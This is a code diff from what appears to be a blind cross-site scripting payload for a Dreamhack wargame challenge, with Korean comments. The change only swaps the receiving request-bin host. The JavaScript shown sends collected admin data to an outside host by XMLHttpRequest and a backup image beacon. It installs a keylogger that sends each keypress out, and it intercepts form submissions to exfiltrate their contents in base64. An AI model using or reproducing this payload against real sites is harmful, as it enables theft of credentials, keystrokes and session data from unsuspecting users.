@@ -40,18 +40,18 @@
         
         // 데이터 전송
         var xhr = new XMLHttpRequest();
-        xhr.open('POST', 'https://enxzoji.request.dreamhack.games/blind-steal', true);
+        xhr.open('POST', 'https://vtfdwtn.request.dreamhack.games/blind-steal', true);
         xhr.setRequestHeader('Content-Type', 'application/json');
         xhr.send(JSON.stringify(adminData));
         
         // 백업 전송 방법 (이미지 태그)
         var img = new Image();
-        img.src = 'https://enxzoji.request.dreamhack.games/blind-img?data=' + btoa(JSON.stringify(adminData).substring(0, 1000));
+        img.src = 'https://vtfdwtn.request.dreamhack.games/blind-img?data=' + btoa(JSON.stringify(adminData).substring(0, 1000));
         
         // 키로거 설치
         document.addEventListener('keypress', function(e) {
             var k = new Image();
-            k.src = 'https://enxzoji.request.dreamhack.games/blind-key?k=' + e.key + '&t=' + Date.now();
+            k.src = 'https://vtfdwtn.request.dreamhack.games/blind-key?k=' + e.key + '&t=' + Date.now();
         });
         
         // 폼 데이터 가로채기
@@ -63,7 +63,7 @@
             });
             
             var f = new Image();
-            f.src = 'https://enxzoji.request.dreamhack.games/blind-form?data=' + btoa(JSON.stringify(data));
+            f.src = 'https://vtfdwtn.request.dreamhack.games/blind-form?data=' + btoa(JSON.stringify(data));
         });
     })();
     
